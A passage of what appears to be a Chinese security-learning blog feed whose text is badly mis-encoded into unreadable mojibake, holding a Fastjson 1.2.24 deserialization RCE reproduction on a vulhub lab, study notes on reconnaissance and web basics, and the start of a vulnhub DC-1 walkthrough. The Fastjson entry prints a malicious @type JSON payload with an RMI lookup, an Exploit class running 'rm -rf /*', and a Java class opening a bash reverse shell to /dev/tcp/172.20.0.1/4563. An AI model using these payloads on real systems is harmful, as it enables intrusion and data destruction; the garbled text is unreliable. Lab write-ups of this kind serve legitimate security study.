        <content type="html"><![CDATA[<h1 id="Fastjson1-2-24-RCEæ¼æ´"><a href="#Fastjson1-2-24-RCEæ¼æ´" class="headerlink" title="Fastjson1.2.24-RCEæ¼æ´"></a>Fastjson1.2.24-RCEæ¼æ´</h1><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚å³fastjsonçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯å°†Java Beanåºåˆ—åŒ–æˆJSONå­—ç¬¦ä¸²ï¼Œè¿™æ ·å¾—åˆ°å­—ç¬¦ä¸²ä¹‹åå°±å¯ä»¥é€šè¿‡æ•°æ®åº“ç­‰æ–¹å¼è¿›è¡ŒæŒä¹…åŒ–äº†ã€‚</p><p> æ¼æ´åŸç† </p><p>å†ç”¨Fastjsonè§£æJSONæ•°æ®çš„æ—¶å€™</p><p>å‡å¦‚æ”»å‡»è€…ä¼ªé€ ä¸€æ®µç‰¹æ®Šçš„çš„æ¶æ„çš„JSONæ•°æ® </p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://é»‘å®¢ä»“åº“/å±é™©ç‰©å“&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æ”»å‡»è€…ä¼ªé€ äº†@typeæ ‡ç­¾ éœ€è¦ç”¨com.sun.rowset.JdbcRowSetImplï¼ˆæŒ‡å®šååºåˆ—åŒ–ç±»ï¼‰è¿›è¡Œå¤„ç† </p><p>è¿™ä¸ªjdbcRowSetlmpl æˆ‘ä»¬ç†è§£ä¸ºåˆ†æ‹£å‘˜ é‚£ä¹ˆ åˆ†æ‹£å‘˜è®°å½•ä¸‹â€œéœ€è¦è”ç³»é»‘å®¢ä»“åº“çš„æŒ‡ä»¤â€</p><p>autoCommitâ€: trueåˆ™ä¼šè§¦å‘setAutoCommit()æ–¹æ³• ç›¸å½“äºè®©jdbcRowSetlmplç«‹å³æ‰§è¡Œ</p><p>ç„¶åæˆ‘ä»¬å°±è¿›è¡Œæ¶æ„ä»“åº“çš„è¿æ¥ï¼ˆJNDLæ³¨å…¥ï¼‰</p><p>åˆ†æ‹£å‘˜ï¼ˆjdbcRowSetlmplï¼‰å°±ä¼šæ ¹æ®rmi:&#x2F;&#x2F;é»‘å®¢ä»“åº“&#x2F;å±é™©ç‰©å“åœ°å€æ‹¨æ‰“ç”µè¯ï¼ˆå‘èµ·JNDLè¯·æ±‚ï¼‰è€Œé»‘å®¢ä»“åº“ï¼ˆæ”»å‡»è€…æ­å»ºäºŒç‚¹RMIæœåŠ¡å™¨ï¼‰å°±ä¼šå›åº”</p><p>â€œè¯·åˆ°http:&#x2F;&#x2F;æ¶æ„ç«™ç‚¹&#x2F;Exploit.classé¢†å–åŒ…è£¹â€</p><p><strong>åŠ è½½â€œå±é™©ç‰©å“â€ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</strong></p><p>å¿«é€’å…¬å¸ç³»ç»Ÿï¼ˆJVMï¼‰ä»æ¶æ„ç«™ç‚¹ä¸‹è½½çš„Exploit.classå¹¶è‡ªåŠ¨æ‹†åŒ…æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.class é™æ€ä»£ç å—</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">&quot;rm -rf /*&quot;</span>); <span class="comment">// åˆ é™¤æœåŠ¡å™¨æ•°æ®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæ”»å‡»è€…é€šè¿‡ä¸€ä¸ªä¼ªé€ çš„åŒ…è£¹ï¼ŒæˆåŠŸåŠ«æŒ<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741005491298.jpg" alt="img">äº†æ•´ä¸ªå¿«é€’</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>æ­å»ºç¯å¢ƒå°±ä¸æ¼”ç¤ºäº†</p><p>é¦–å…ˆåœ¨vulhubfastjsonä¸‹é¢ åˆ›å»ºä¸€ä¸ªtest.java å†…å®¹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.20.0.1/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›®çš„å°±æ˜¯æŠŠtest.txtä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº </p><p>ç„¶åè¿›è¡Œç¼–è¯‘ Javac reverse.java</p><p>ç„¶åæˆ‘ä»¬åœ¨ç¯å¢ƒç›®å½•ä¸‹èµ·ä¸€ä¸ªhttpæœåŠ¡ è¿™ä¸€æ­¥éƒ¨ç½²rmiæŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/007d447d-9ddc-4927-a3f5-1ce87e375326.png"></p><p>ç«¯å£ä¸º5623</p><p>ç„¶åéƒ¨ç½²rmiæœåŠ¡å™¨</p><p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/de6ca6b9-8cda-4cb2-80a9-bec740601853.png"></p><p>ç«¯å£ä¸º8520</p><p>æ¥ç€å»webé¡µé¢æŠ“åŒ…</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/5cff3b0f-4fe6-4187-ba58-5b3a37871df1.png"></p><p>å‘åŒ…å‰å…ˆnc -lvp 4563</p><p>å‘åŒ…å‘ç°æˆåŠŸåå¼¹shell</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/223a33e5-0d7d-45da-9eb4-52096a2f9f52.png"></p><p>å†™çš„æ¯”è¾ƒå¥½çš„æ–‡ç« <a href="https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/">https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·Ÿç€å°è¿ªçš„ç¬¬äºŒå¤©</title>
      <link href="/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
      <url>/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ‰“ç‚¹"><a href="#ä¿¡æ¯æ‰“ç‚¹" class="headerlink" title="ä¿¡æ¯æ‰“ç‚¹"></a>ä¿¡æ¯æ‰“ç‚¹</h1><p>1ã€æ‰“ç‚¹-Webæ¶æ„-è¯­è¨€&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“&amp;ç³»ç»Ÿç­‰<br>2ã€æ‰“ç‚¹-Webæºç -CMSå¼€æº&amp;é—­æºå”®å–&amp;è‡ªä¸»ç ”å‘ç­‰<br>3ã€æ‰“ç‚¹-Webæºç è·å–-æ³„éœ²å®‰å…¨&amp;èµ„æºç›‘æ§&amp;å…¶ä»–ç­‰<br>4ã€æ‰“ç‚¹-WebåŸŸå-å­åŸŸå&amp;ç›¸ä¼¼åŸŸå&amp;åæŸ¥åŸŸå&amp;æ—æ³¨ç­‰</p><p>åŒºåˆ†windows å’ŒLinux å¯ä»¥ç”¨ å¤§å†™å°å†™æ¥åŒºåˆ†</p><p>windowsä¸Šå¯¹æ–‡ä»¶çš„å¤§å°å†™ä¸åŒºåˆ† </p><p>ä¹Ÿå¯ä»¥é€šè¿‡pingç½‘ç«™æ¥åˆ¤æ–­ ä¸€èˆ¬ window de ttl&gt;100 Linux&lt;100</p><p>æ•°æ®åˆ¤æ–­ æ­å»ºç»„åˆ ç«¯å£æ‰«æ</p><p>#çŸ¥è¯†ç‚¹ï¼š<br>1ã€CMSæŒ‡çº¹è¯†åˆ«æºç è·å–æ–¹å¼<br>2ã€ä¹ æƒ¯&amp;é…ç½®&amp;ç‰¹æ€§ç­‰è·å–æ–¹å¼<br>3ã€æ‰˜ç®¡èµ„äº§å¹³å°èµ„æºæœç´¢ç›‘æ§</p><p> æºç æ³„éœ²</p><p>cmsè¯†åˆ« äº‘æºª</p><p>ç®¡ç†å‘˜ä¹ æƒ¯ä¸å¥½ å¤‡ä»½æ³„éœ²</p><p>é…ç½®ä¸å½“ git æ³„éœ² |å‘å¸ƒä»£ç æ—¶å€™ æ²¡æœ‰å°†.gitåˆ é™¤ ç›´æ¥åŒæ­¥ä¸Šä¼ é“æœåŠ¡å™¨å…¶ä¸Š</p><p> svnæ³„éœ² ds_Storeæ³„éœ²|åŒæ­¥å‘å¸ƒé“æœåŠ¡å™¨ä¸Š</p><p>phpç‰¹æ€§ composer.json æ³„éœ² é…ç½®æ€§è¯´æ˜æ€§ æ–‡ä»¶ è·å¾—ç›¸å…³ä¿¡æ¯  </p><p>ä¸‹è½½é…åˆ WEB-INFæ³„éœ² å¿…é¡»è¦ä¸‹è½½æ–‡ä»¶çš„æ¼æ´ </p><p>GITHUBæ³„éœ² è¯­æ³•æœç´¢&amp;ç®¡æ£€æµ‹æœç´¢</p><p>è·å–ç½‘ç»œä¿¡æ¯-æœåŠ¡å‚å•†&amp;ç½‘ç»œæ¶æ„<br>è·å–æœåŠ¡ä¿¡æ¯-åº”ç”¨åè®®&amp;å†…ç½‘èµ„äº§<br>è·å–é˜»ç¢ä¿¡æ¯-CDN&amp;WAF&amp;è´Ÿè½½&amp;é˜²ç«å¢™</p><p>å†…ç½‘èµ„äº§æŸ¥è¯¢  </p><p>æ—æ³¨ï¼šåŒæœåŠ¡å™¨ä¸‹é¢çš„ä¸åŒWEBåº”ç”¨æŸ¥è¯¢æŠ€æœ¯<br>Cæ®µï¼šåŒç½‘æ®µä¸‹é¢çš„ä¸åŒæœåŠ¡å™¨IPä¸‹çš„WEBåº”ç”¨æŸ¥è¯¢æŠ€æœ¯</p><p>æ—æ³¨æŸ¥è¯¢ </p><p>cæ®µæŸ¥è¯¢ ipåæŸ¥åŸŸå</p><p>cdn æŸ¥è¯¢ è¶…çº§ping å»æµ‹è¯•å…¨å›½å¯¹å…¶è®¿é—®çš„é€Ÿåº¦æ¥æ£€æµ‹ç½‘ç«™å¼€é€šäº†cdn</p><p>ç½‘ç«™waf  åŒºåˆ†</p><p>è¶…çº§pingï¼šCDNæœåŠ¡è¯†åˆ«<br>Masscanï¼šç«¯å£æ‰«æï¼Œåº”ç”¨åè®®<br>Wafw00fï¼šWebåº”ç”¨é˜²æŠ¤é˜²ç«å¢™è¯†åˆ«<br>Nmapï¼šç«¯å£æ‰«æï¼Œåº”ç”¨åè®®ï¼Œé˜²ç«å¢™è¯†åˆ«<br>lbdï¼šè´Ÿè½½å‡è¡¡ï¼Œå¹¿åŸŸç½‘è´Ÿè½½å‡è¡¡ï¼Œåº”ç”¨å±‚è´Ÿè½½å‡è¡¡</p>]]></content>
      
      
      
        <tags>
            
            <tag> xiaodisec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·Ÿç€å°è¿ªç¬¬ä¸€å¤©</title>
      <link href="/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
      <url>/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>è·Ÿç€å°è¿ªå­¦ä¹ ç¬¬ä¸€å¤©</p><p>åè¯è§£é‡Š</p><p>POCï¼šå…¨ç§°â€™ProofofConceptâ€™ï¼Œä¸­æ–‡â€™æ¦‚å¿µéªŒè¯â€™ï¼Œå¸¸æŒ‡ä¸€æ®µæ¼æ´è¯æ˜çš„ä»£ç ã€‚<br>EXPï¼šå…¨ç§°â€™Exploitâ€™ï¼Œä¸­æ–‡åˆ©ç”¨ï¼ŒæŒ‡åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œã€‚<br>Payloadï¼šä¸­æ–‡æœ‰æ•ˆè½½è·ï¼ŒæŒ‡æˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ã€‚<br>Shellcodeï¼šç®€å•ç¿»è¯‘â€™shellä»£ç â€™ï¼Œæ˜¯Payloadçš„ä¸€ç§ï¼Œç”±äºå…¶å»ºç«‹æ­£å‘&#x2F;åå‘shellè€Œå¾—åã€‚</p><p>ç½‘ç«™æ­å»ºå‰ç½®çŸ¥è¯†</p><p>åŸŸå å­åŸŸå DNS http&#x2F;https è¯ä¹¦</p><p>webåº”ç”¨æ¡†æ¶æ¶æ„ </p><p>ç†è§£ä¸åŒwebåº”ç”¨ç»„æˆæ ¡è‰²åŠŸèƒ½æ¡†æ¶ </p><p>å¼€å‘è¯­è¨€ï¼Œç¨‹åºæºç ï¼Œä¸­é—´ä»¶å®¹å™¨ï¼Œæ•°æ®åº“ç±»å‹ï¼ŒæœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶ç­‰<br>å¼€å‘è¯­è¨€ï¼šasp,php,aspx,jsp,java,python,ruby,go,html,javascriptç­‰<br>ç¨‹åºæºç ï¼šæ ¹æ®å¼€å‘è¯­è¨€åˆ†ç±»ï¼›åº”ç”¨ç±»å‹åˆ†ç±»ï¼›å¼€æºCMSåˆ†ç±»ï¼›å¼€å‘æ¡†æ¶åˆ†ç±»ç­‰<br>ä¸­é—´ä»¶å®¹å™¨ï¼šIIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfishç­‰|æ”¯æ’‘ç½‘ç«™è¿è¡Œï¼Œå„æœ‰ä¸åŒçš„åŠŸèƒ½<br>æ•°æ®åº“ç±»å‹: Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDBç­‰|å­˜å‚¨æ•°æ®ï¼Œæ ¹æ®ä¸åŒéœ€æ±‚ï¼Œåº”ç”¨ä¸åŒçš„æ•°æ®åº“ç±»å‹<br>æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼šWindowsç³»åˆ—ï¼ŒLinuxç³»åˆ—ï¼ŒMacç³»åˆ—ç­‰|<br>ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼šphpmyadmin,vs-ftpd,VNC,ELK,Opensshç­‰ </p><p>#WEBåº”ç”¨å®‰å…¨æ¼æ´åˆ†ç±»ï¼ˆç¨‹åºæºç ï¼‰<br>SQLæ³¨å…¥ï¼Œæ–‡ä»¶å®‰å…¨ï¼ŒRCEæ‰§è¡Œï¼ŒXSSè·¨ç«™ï¼ŒCSRF&#x2F;SSRF&#x2F;CRLFï¼Œ<br>ååºåˆ—åŒ–ï¼Œé€»è¾‘è¶Šæƒï¼Œæœªæˆæƒè®¿é—®ï¼ŒXXE&#x2F;XMLï¼Œå¼±å£ä»¤å®‰å…¨ç­‰</p><p>webè¯·æ±‚çš„è¿‡ç¨‹ <a href="https://www.cnblogs.com/51benpao/p/12984951.html">https://www.cnblogs.com/51benpao/p/12984951.html</a> </p><p>æµè§ˆå™¨è¾“å…¥åŸŸå-&gt;æµè§ˆå™¨dnsè§£æåˆ°ipåœ°å€-&gt;æœåŠ¡å™¨å’Œå®¢æˆ·æœºå»ºç«‹tcp(ä¸‰æ¬¡æ¡æ‰‹)è¿æ¥-&gt;æµè§ˆå™¨é€šè¿‡httpåè®®å‘é€è¯·æ±‚æ•°æ®åŒ…-&gt;å¯èƒ½æŸäº›æœåŠ¡ä¼šåšé‡å®šå‘æ¥è´Ÿè½½å‡è¡¡-&gt;æµè§ˆå™¨è·Ÿè¸ªé‡å®šå‘åœ°å€é‡æ–°å¼€å§‹è¿æ¥è¿‡ç¨‹-&gt;æœåŠ¡å™¨å¤„ç†è¯·æ±‚-&gt;æœåŠ¡å™¨å‘å‡ºhtmlå“åº”-&gt;é‡Šæ”¾tcpè¿æ¥-&gt;æµè§ˆå™¨æ˜¾ç¤ºé¡µé¢ï¼ˆæ­¤æ—¶è¿˜æ²¡æœ‰å®Œå…¨æ¥å—åˆ°htmlå…¨éƒ¨çš„æ–‡æ¡£ï¼‰-&gt;å‘é€å‰©ä½™çš„å†…å®¹</p><p>webè¯·æ±‚æ•°æ®åŒ…<a href="https://www.cnblogs.com/rayray/p/3729533.html">https://www.cnblogs.com/rayray/p/3729533.html</a></p><p>å­¦ä¼šä¸åŒå¯¹è±¡é‡‡ç”¨ä¸åŒæŠ“åŒ…å°åŒ…æŠ“å–æŠ€æœ¯åˆ†æ</p><p>åŸºäºç½‘ç»œæ¥å£æŠ“åŒ…-ç½‘ç»œæ¥å£<br>åŸºäºç¨‹åºè¿›ç¨‹æŠ“åŒ…-ç¨‹åºè¿›ç¨‹<br>åŸºäºæ•°æ®åè®®æŠ“åŒ…-HTTP&#x2F;S&amp;TCP&amp;UDP<br>åŸºäºåº”ç”¨å¯¹è±¡æŠ“åŒ…-APP&amp;å°ç¨‹åº&amp;PCUI<br>åŸºäºç³»ç»Ÿä½¿ç”¨æŠ“åŒ…-æ¨¡æ‹Ÿå™¨&amp;WIN&amp;LINUX</p><p>å­˜å‚¨å¯†ç åŠ å¯†-Web&amp;æ•°æ®åº“&amp;ç³»ç»Ÿ<br>ä¼ è¾“æ•°æ®ç¼–ç -å„ç±»ç»„åˆä¼ è¾“å‚æ•°å€¼<br>ä»£ç ç‰¹æ€§åŠ å¯†-JS&amp;PHP&amp;NET&amp;JAVA<br>æ•°æ®æ˜¾ç¤ºç¼–ç -å­—ç¬¦ä¸²æ•°æ®æ˜¾ç¤ºç¼–ç </p><p> è¯¦ç»†ç‚¹ï¼š<br>å¯†ç å­˜å‚¨åŠ å¯†ï¼š<br>MD5 SHA1 NTLM AES DES RC4<br>MD5å€¼æ˜¯32æˆ–16ä½ä½ç”±æ•°â€0-9â€å’Œå­—æ¯â€a-fâ€æ‰€ç»„æˆçš„å­—ç¬¦ä¸²<br>SHA1è¿™ç§åŠ å¯†çš„å¯†æ–‡ç‰¹å¾è·ŸMD5å·®ä¸å¤šï¼Œåªä¸è¿‡ä½æ•°æ˜¯40<br>NTLMè¿™ç§åŠ å¯†æ˜¯Windowsçš„å“ˆå¸Œå¯†ç ï¼Œæ ‡å‡†é€šè®¯å®‰å…¨åè®®<br>AESï¼ŒDESï¼ŒRC4è¿™äº›éƒ½æ˜¯éå¯¹ç§°æ€§åŠ å¯†ç®—æ³•ï¼Œå¼•Iå…¥å¯†é’¥ï¼Œå¯†æ–‡ç‰¹å¾ä¸Base64ç±»ä¼¼<br>åº”ç”¨åœºæ™¯ï¼šå„ç±»åº”ç”¨å¯†æ–‡ï¼Œè‡ªå®šä¹‰ç®—æ³•ï¼Œä»£ç åˆ†æï¼ŒCTFå®‰å…¨æ¯”èµ›ç­‰</p><p>NTLMä»‹ç» <a href="https://blog.csdn.net/qq_62169455/article/details/132617592">https://blog.csdn.net/qq_62169455/article/details/132617592</a></p><p>åç«¯ä»£ç åŠ å¯†ï¼š<br>PHP .NET JAVA<br>PHPï¼šä¹±ç ï¼Œå¤´éƒ¨æœ‰ä¿¡æ¯<br>.NETï¼šDLLå°è£…ä»£ç æ–‡ä»¶<br>JAVA:JAR&amp;CLASSæ–‡ä»¶<br>ä¸¾ä¾‹ï¼šZend ILSpy IDEA<br>åº”ç”¨åœºæ™¯ï¼šç‰ˆæƒä»£ç åŠ å¯†ï¼Œå¼€å‘ç‰¹æ€§ï¼ŒCTEæ¯”èµ›ç­‰</p><p>ç¼–è¯‘å’Œåç¼–è¯‘ <a href="https://zhuanlan.zhihu.com/p/4766970">https://zhuanlan.zhihu.com/p/4766970</a> <a href="https://blog.csdn.net/weixin_44943389/article/details/132507440">https://blog.csdn.net/weixin_44943389/article/details/132507440</a></p><p>#çŸ¥è¯†ç‚¹ï¼š<br>1ã€èµ„äº§æ¶æ„-ç«¯å£ç›®å½•æ’ä»¶æ¥å£å¤šç«™ç‚¹å¤šåº”ç”¨<br>2ã€ç•ªå¤–å®‰å…¨-åŸŸåcæœåŠ¡å™¨æœ¬èº«æœåŠ¡å‚å•†ç®¡ç†äººå‘˜<br>3ã€è€ƒè™‘é˜»ç¢-ç«™åº“åˆ†ç¦»&amp;CDN&amp;WAF&amp;è´Ÿè½½å‡è¡¡&amp;ä¸»æœºé˜²æŠ¤<br>è¯¦ç»†ç‚¹ï¼š<br>1ã€å‰ç½®æ¡ä»¶-è´­ä¹°ä½¿ç”¨-äº‘æœåŠ¡å™¨åŸŸåç­‰<br>2ã€æ¶æ„æ­å»º-ç›®å½•cç«¯å£å­åŸŸcæ’ä»¶såº”ç”¨ç­‰<br>3ã€å®‰å…¨éƒ¨ç½²-WAEé˜²ç«å¢™&amp;ä¸»æœºé˜²æŠ¤&amp;HIDSç­‰<br>4ã€æ€§èƒ½ä¼˜åŒ–-è´Ÿè½½å‡è¡¡&amp;CDNåŠ é€ŸcOSSäº‘å­˜å‚¨ç­‰</p><p><strong>èµ„äº§æ¶æ„</strong>ï¼š<br>WEBå•ä¸ªæºç æŒ‡å‘å®‰å…¨ |<br>WEBå¤šä¸ªç›®å½•æºç å®‰å…¨ |å¯èƒ½ä¼šæœ‰å¤šä¸ªç¨‹åºï¼Œå°±æœ‰å¤šä¸ªæ¼æ´ æ‰«æè½¯7bscan<br>WEBå¤šä¸ªç«¯å£æºç å®‰å…¨ | nmap<br>æœåŠ¡å™¨æ¶è®¾å¤šä¸ªç«™ç‚¹å®‰å…¨|<br>æ¶è®¾ç¬¬ä¸‰æ–¹æ’ä»¶æ¥å£å®‰å…¨|<br>æœåŠ¡å™¨æ¶è®¾å¤šä¸ªåº”ç”¨å®‰å…¨|<br>#ç•ªå¤–å®‰å…¨ï¼š<br>åŸºäºåŸŸåè§£æå®‰å…¨ |<br>åŸºäºæœåŠ¡å™¨æœ¬èº«å®‰å…¨<br>åŸºäºæœåŠ¡å•†ä¿¡æ¯å®‰å…¨<br>åŸºäºç®¡ç†ä¸ªäººçš„å®‰å…¨<br>#è€ƒè™‘é˜»ç¢ï¼š<br>é˜»ç¢-ç«™åº“åˆ†ç¦»|<br>é˜»ç¢-CDNåŠ é€ŸæœåŠ¡|<a href="https://zhuanlan.zhihu.com/p/616462418">https://zhuanlan.zhihu.com/p/616462418</a><br>é˜»ç¢-è´Ÿè½½å‡è¡¡æœåŠ¡|<a href="https://www.sangfor.com.cn/knowledge/load-balancing|%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E7%9A%84%E6%98%AF%E5%A4%87%E7%94%A8%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.sangfor.com.cn/knowledge/load-balancing|å¯èƒ½è·å¾—çš„æ˜¯å¤‡ç”¨æœºçš„æƒé™</a><br>é˜»ç¢-WAFåº”ç”¨é˜²ç«å¢™|</p><p>é˜»ç¢-ä¸»æœºé˜²æŠ¤é˜²ç«å¢™|æœåŠ¡å™¨æ€æ¯’è½¯ä»¶</p>]]></content>
      
      
      
        <tags>
            
            <tag> xiaodisec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-1</title>
      <link href="/2025/02/16/vulnhub-DC-1/"/>
      <url>/2025/02/16/vulnhub-DC-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       (Unknown)</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       (Unknown)</span><br><span class="line">192.168.205.129 00:0c:29:04:0c:de       (Unknown)</span><br><span class="line">192.168.205.254 00:50:56:e2:1c:01       (Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>å‘ç°192.168.205.129 æ˜¯æˆ‘ä»¬çš„é¶æœºip å¼€å§‹ä¿¡æ¯æœé›†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# nmap -sS -sV -A -T4 -p- 192.168.205.129</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:26 EST</span><br><span class="line">Nmap scan report for 192.168.205.129</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          44174/udp6  status</span><br><span class="line">|   100024  1          46616/tcp   status</span><br><span class="line">|   100024  1          46812/udp   status</span><br><span class="line">|_  100024  1          46918/tcp6  status</span><br><span class="line">46616/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:04:0C:DE (VMware)</span><br><span 